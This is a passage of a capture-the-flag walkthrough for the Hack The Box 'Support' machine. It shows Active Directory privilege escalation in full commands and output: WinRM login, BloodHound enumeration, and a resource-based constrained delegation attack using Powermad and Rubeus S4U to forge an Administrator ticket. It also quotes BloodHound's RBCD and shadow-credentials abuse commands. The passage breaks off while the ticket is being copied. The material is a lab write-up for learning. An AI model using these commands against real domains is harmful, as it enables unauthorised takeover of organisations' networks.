`netexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'`:
```
WINRM       10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!) 📌
```

`evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents>
```

![Victim: support](https://custom-icon-badges.demolab.com/badge/Victim-support-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
support\support
```

`cd C:\\Users\support\Desktop`

`dir`:
```
    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/21/2024   2:17 PM             34 user.txt
```

`type user.txt`:
```
a868f*************************** 🚩
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group 📌
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group 🔍
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

The `support` user seems to be a member of a non default group called `Shared Support Accounts` as well as the `Authenticated Users` group. Let's use `BloodHound` to identify potential attack paths is this domain that can help us increase our privileges.

`cd C:\\Users\support\appdata\local\temp`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'sharphound.exe'`:
```
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/SharpHound.exe
/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
/usr/lib/bloodhound/resources/app/Collectors/DebugBuilds/SharpHound.exe
/usr/share/metasploit-framework/data/post/SharpHound.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_Any/SharpHound.exe ./sharphound.exe`

`upload ./sharphound.exe`:
```
Info: Uploading /home/kali/sharphound.exe to C:\Users\support\appdata\local\temp\sharphound.exe
                                        
Data: 965288 bytes of 965288 bytes copied
                                        
Info: Upload successful!
```

![Victim: support](https://custom-icon-badges.demolab.com/badge/Victim-support-64b5f6?logo=windows11&logoColor=white)

`.\sharphound.exe`:
```
2024-11-21T15:27:40.5406028-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-11-21T15:27:40.5718139-08:00|INFORMATION|Initializing SharpHound at 3:27 PM on 11/21/2024
2024-11-21T15:27:40.8374435-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for support.htb : dc.support.htb
2024-11-21T15:27:40.9780690-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-11-21T15:27:41.1655783-08:00|INFORMATION|Beginning LDAP search for support.htb
2024-11-21T15:27:41.2124335-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-11-21T15:27:41.2124335-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-11-21T15:28:11.6969007-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2024-11-21T15:28:29.1186893-08:00|INFORMATION|Consumers finished, closing output channel
2024-11-21T15:28:29.1655689-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-11-21T15:28:29.5093101-08:00|INFORMATION|Status: 109 objects finished (+109 2.270833)/s -- Using 44 MB RAM
2024-11-21T15:28:29.5093101-08:00|INFORMATION|Enumeration finished in 00:00:48.3564838
2024-11-21T15:28:29.6030739-08:00|INFORMATION|Saving cache with stats: 68 ID to type mappings.
 68 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-11-21T15:28:29.6186913-08:00|INFORMATION|SharpHound Enumeration Completed at 3:28 PM on 11/21/2024! Happy Graphing!
```

`dir`:
```
    Directory: C:\Users\support\appdata\local\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/21/2024   3:28 PM          12478 20241121152828_BloodHound.zip
-a----        11/21/2024   3:27 PM         723968 sharphound.exe
-a----        11/21/2024   3:28 PM          10176 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
```

`move 20241121152828_BloodHound.zip bloodhound.zip`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download bloodhound.zip`:
```
Info: Downloading C:\Users\support\appdata\local\temp\bloodhound.zip to bloodhound.zip
                                        
Info: Download successful!
```

`sudo neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/bloddhound.zip` > `Clear Finished`

`Search for a node: svc_loanmgr` > `SUPPORT@SUPPORT.HTB` > `<right-click>` > `Mark User as Owned`

`SUPPORT@SUPPORT.HTB` > `Node Info` > `Group Membership` > `Unrolled Group Membership`

`Graph`:
```
SUPPORT ---(MemberOf)--- SHARED SUPPORT ACCOUNTS
```

`SHARED SUPPORT ACCOUNTS@SUPPORT.HTB` > `Reachable High Value Targets`

`Graph`:
```
SHARED SUPPORT ACCOUNTS ---(GenericAll)--- DC.SUPPORT.HTB
```

<🔄 Alternative Step>

`SUPPORT@SUPPORT.HTB` > `Node Info` > `Outbound Object Control` > `Group Delegated Object Control`

`Graph`:
```
SUPPORT ---(MemberOf)--- SHARED SUPPORT ACCOUNTS
```
```
SHARED SUPPORT ACCOUNTS ---(GenericAll)--- DC.SUPPORT.HTB
```

</🔄 Alternative Step>

`GenericAll`:
```
Info:

The members of the group SHARED SUPPORT ACCOUNTS@SUPPORT.HTB have GenericAll privileges to the computer DC.SUPPORT.HTB.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
```
```
Windows Abuse:

Full control of a computer object can be used to perform a resource based constrained delegation attack.

Abusing this primitive is possible through the Rubeus project.

First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
~~~
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
~~~

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
~~~
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
~~~

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
~~~
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)
~~~

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
~~~
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
~~~

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
~~~
Rubeus.exe hash /password:Summer2018!
~~~

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
~~~
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
~~~
```
```
Linux Abuse:

#### Resource-Based Constrained Delegation

First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:
~~~
addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
~~~

We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:
~~~
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'
~~~

And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.
~~~
getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'
~~~

This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.

#### Shadow Credentials attack

To abuse this privilege, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).
~~~
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
~~~

For other optional parameters, view the pyWhisker documentation.
```

`BloodHound` mentions that due to the `GenericAll` privilege we can perform a [Resource Based Constrained Delegation (RBCD) attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) and escalate our privileges.

**Resource Based Constrained Delegation**

In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain; let's call this computer `FakeComputer`, and configure the Domain Controller (DC) to allow `FakeComputer` to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos tickets for `FakeComputer`, with the ability to impersonate a highly privileged user on the Domain, such as the `Administrator`. After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain.

The attack relies on three prerequisites:
1. We need a shell or code execution as a domain user that belongs to the `Authenticated Users` group. By default any member of this group can add up to 10 computers to the domain.
2. The `ms-ds-machineaccountquota` attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.
3. Our current user or a group that our user is a member of, needs to have WRITE privileges (`GenericAll` or `WriteDACL`) over a domain joined computer (in this case the Domain Controller).

From our previous enumeration we know that the support user is indeed a member of the `Authenticated Users` group as well as the `Shared Support Accounts` group. We also know that the `Shared Support Accounts` group has `GenericAll` privileges over the Domain Controller (`dc.support.htb`).

Let's check the value of the `ms-ds-machineaccountquota` attribute.

`ldapsearch -x -H ldap://10.10.11.174 -b "dc=support,dc=htb" -D 'support@support.htb' -w 'Ironside47pleasure40Watchful' "(objectClass=domainDNS)" ms-DS-MachineAccountQuota`:
```
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (objectClass=domainDNS)
# requesting: ms-DS-MachineAccountQuota 
#

# support.htb
dn: DC=support,DC=htb
ms-DS-MachineAccountQuota: 10 📌

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

<🔄 Alternative Step>

![Victim: support](https://custom-icon-badges.demolab.com/badge/Victim-support-64b5f6?logo=windows11&logoColor=white)

`Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Property ms-DS-MachineAccountQuota`:
```
DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10 📌
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
```

</🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

The output of the above command shows that this attribute is set to 10, which means each authenticated domain user can add up to 10 computers to the domain.
Next, let's verify that the `msds-allowedtoactonbehalfofotheridentity` attribute is empty. To do so, we need the `PowerView` module for PowerShell. We can upload it to the server via `Evil-WinRM`.

`locate -i 'powerview.ps1'`:
```
/home/kali/.local/share/pipx/venvs/pwncat-cs/lib/python3.12/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
/home/kali/tools/PowerSploit/Recon/PowerView.ps1
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

`cp /home/kali/tools/PowerSploit/Recon/PowerView.ps1 ./powerview.ps1`

`upload ./powerview.ps1`:
```
Info: Uploading /home/kali/powerview.ps1 to C:\Users\support\appdata\local\temp\powerview.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

![Victim: support](https://custom-icon-badges.demolab.com/badge/Victim-support-64b5f6?logo=windows11&logoColor=white)

`. .\powerview.ps1`

Once the module has been imported we can use the `Get-DomainComputer` commandlet to query the required information.

`Get-DomainComputer -identity 'DC' | select name, msds-allowedtoactonbehalfofotheridentity`:
```
name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC   
```

The value is empty, which means we are ready to perform the RBCD attack, but first let's upload the tools that are required. We will need `Powermad` and `Rubeus`, which we can upload using `Evil-WinRM`.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'powermad.ps1'`:
```
/home/kali/tools/Powermad/Powermad.ps1
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powermad.ps1
```

`cp /home/kali/tools/Powermad/Powermad.ps1 ./powermad.ps1`

`upload ./powermad.ps1`:
```
Info: Uploading /home/kali/powermad.ps1 to C:\Users\support\appdata\local\temp\powermad.ps1
                                        
Data: 180768 bytes of 180768 bytes copied
                                        
Info: Upload successful!
```

`locate -i 'rubeus.exe'`:
```
/home/kali/tools/Ghostpack-CompiledBinaries/Rubeus.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v3.5 compiled binaries/Rubeus.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.5 compiled binaries/Rubeus.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.7.2 compiled binaries/Rubeus.exe
/home/kali/tools/Ghostpack-CompiledBinaries/dotnet v4.8.1 compiled binaries/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_Any/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x64/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x86/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/Rubeus.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/Rubeus.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_Any/Rubeus.exe ./rubeus.exe`

`upload ./rubeus.exe`:
```
Info: Uploading /home/kali/rubeus.exe to C:\Users\support\appdata\local\temp\rubeus.exe
                                        
Data: 617128 bytes of 617128 bytes copied
                                        
Info: Upload successful!
```

![Victim: support](https://custom-icon-badges.demolab.com/badge/Victim-support-64b5f6?logo=windows11&logoColor=white)

`. .\powermad.ps1`

**Creating a Computer Object**

Now, let's create a fake computer and add it to the domain. We can use `Powermad`'s `New-MachineAccount` to achieve this.

`New-MachineAccount -MachineAccount 'FakeComputer' -Password $(ConvertTo-SecureString 'H4ck3d!' -AsPlainText -Force)`:
```
[+] Machine account FakeComputer added
```

The above command added a machine with the name `FakeComputer` to the domain. We can verify this new machine with the following command.

`Get-ADComputer -identity 'FakeComputer'`:
```
DistinguishedName : CN=FakeComputer,CN=Computers,DC=support,DC=htb
DNSHostName       : FakeComputer.support.htb
Enabled           : True
Name              : FakeComputer
ObjectClass       : computer
ObjectGUID        : ca5e29e0-688f-461a-9f1b-dcb056978f3e
SamAccountName    : FakeComputer$
SID               : S-1-5-21-1677581083-3380853377-188903654-5602 📌
UserPrincipalName :
```

The output shows the details of `FakeComputer` and we can clearly see the `SID` value it was assigned.

**Configuring RBCD**

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can either set the P`rincipalsAllowedToDelegateToAccount` value to `FakeComputer` through the built-in PowerShell Active Directory module, which will in turn configure the `msds-allowedtoactonbehalfofotheridentity` attribute on its own, or we can use the `PowerView` module to directly set the `msds-allowedtoactonbehalfofotheridentity` attribute.

For the purposes of this walkthrough we will use the former as it is a bit easier to understand. Let's use the `Set-ADComputer` command to configure RBCD.

`Set-ADComputer -Identity 'DC' -PrincipalsAllowedToDelegateToAccount 'FakeComputer$'`

To verify that the command worked, we can use the `Get-ADComputer` command.

`Get-ADComputer -Identity 'DC' -Properties PrincipalsAllowedToDelegateToAccount`:
```
DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=FakeComputer,CN=Computers,DC=support,DC=htb} 📌
SamAccountName                       : DC$ 📌
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
```

As we can see, the `PrincipalsAllowedToDelegateToAccount` is set to `FakeComputer`, which means the command worked. We can also verify the value of the `msds-allowedtoactonbehalfofotheridentity`.

`Get-DomainComputer 'DC' | select msds-allowedtoactonbehalfofotheridentity`:
```
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

As we can see, the `msds-allowedtoactonbehalfofotheridentity` now has a value, but because the type of this attribute is `Raw Security Descriptor` we will have to convert the bytes to a string to understand what's going on.
First, let's grab the desired value and dump it to a variable called `RawBytes`.

`$RawBytes = Get-DomainComputer 'DC' -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`

Then, let's convert these bytes to a `Raw Security Descriptor` object.

`$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`

Finally, we can print both the entire security descriptor, as well as the `DiscretionaryAcl` class, which represents the Access Control List that specifies the machines that can act on behalf of the DC.

`$Descriptor`:
```
ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80
```

`$Descriptor.DiscretionaryAcl`:
```
BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5602 📌
AceType            : AccessAllowed 📌
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

From the output we can see that the `SecurityIdentifier` is set to the `SID` of `FakeComputer` that we saw earlier, and the `AceType` is set to `AccessAllowed`.

**Performing a S4U Attack**

It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator. We will be using `Rubeus` to perform this attack.

First, we will need the hash of the password that was used to create the computer object.

`./rubeus.exe hash /password:'H4ck3d!' /user:'FakeComputer$' /domain:support.htb`:
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : H4ck3d!
[*] Input username             : FakeComputer$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfakecomputer.support.htb
[*]       rc4_hmac             : BC4103A138C65BD0C9C68CDE4333C155 📌
[*]       aes128_cts_hmac_sha1 : C0E76E7737A3AC1EE15AE8B17A8F3C00
[*]       aes256_cts_hmac_sha1 : 3CB08D246200387C5584DD0BD36746E221591E39784209458BA81341BB97428A
[*]       des_cbc_md5          : 2962D049518CABC1
```

We need to grab the value called `rc4_hmac`. Next, we can generate Kerberos tickets for the `Administrator`.

`.\rubeus.exe s4u /user:'FakeComputer$' /rc4:'BC4103A138C65BD0C9C68CDE4333C155' /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt`:
```
    ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Using rc4_hmac hash: BC4103A138C65BD0C9C68CDE4333C155
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FakeComputer$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

[...]

[*] Action: S4U

[*] Building S4U2self request for: 'FakeComputer$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FakeComputer$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

[...]

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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


[+] Ticket successfully imported!
```

`Rubeus` successfully generated the tickets.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

We can now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as `Administrator`. To do so, copy the value of the last ticket and paste it inside a file called `ticket.kirbi.b64`.

Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.

`vim ./ticket.txt`:
```
doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQaiggUpBIIFJaDGA5c8
      f1eq4EUCd664d+jyNy1dug60hlRzgoL5bYPM//W+Jd8CfZdbAXCWfpLGi+ZaGsgfth3cHwXMxKuT0RLk
      NOO4oaXzyZdBujZzIrTFVTR2PHfmqaW89b7F+Jkn5Jq/ZKdaFwsGtd4qkzDK4xx//ekY+0JXSPHA+4L8
      CYB7h2pbEbWXOy9ZoUjn+SGAQyxu6viAFNWtjBerNEPPymrH3wBJjQF5jV0SB4EgREEUpMb0EyJL1fYx
      hMaC2u35WOXyHUvtjFkHKZea6oKyjCbf8oNw3dciT0TisaSFQ7BSb2cKRzl+UW831J5UL9LwPsqdNpEN
      7VX00vUiXO1wHi5I0HZYVM5T4CNSLg/zojX4iL2QE6901mUR1Zuml4CctpuKoeGkgsE5143xMY6A3x3e
      UWBQD01WLLHOkrZ5MkJwPCYcZ2xG4ESLZHtjNUi8cbsZqxP9QBME3alfpZuSS79chvYRTbC5xEInpDDE
      GSITTwjfnJ++4PmtGCQQA1qy9TWDWRJ/vguWBxrSVDKdZOIr1CKvRgm51ILkucueJQ2kYucabnp2zDdr
      3K+fWYI1M+1FMzB4UV9oFJ+l5/3wv3cO3ncSyckCXexJSVTMu22+aLOkej27QY7jhXbe8hieryb0i0ph
      aj46r0tyXDZ4l+ly1gRdbEDInP1Zkl8VXNkbvvOYQMhm/ONBmBtO40LUkToeOKslhg+WPQ69CcZxmJWO
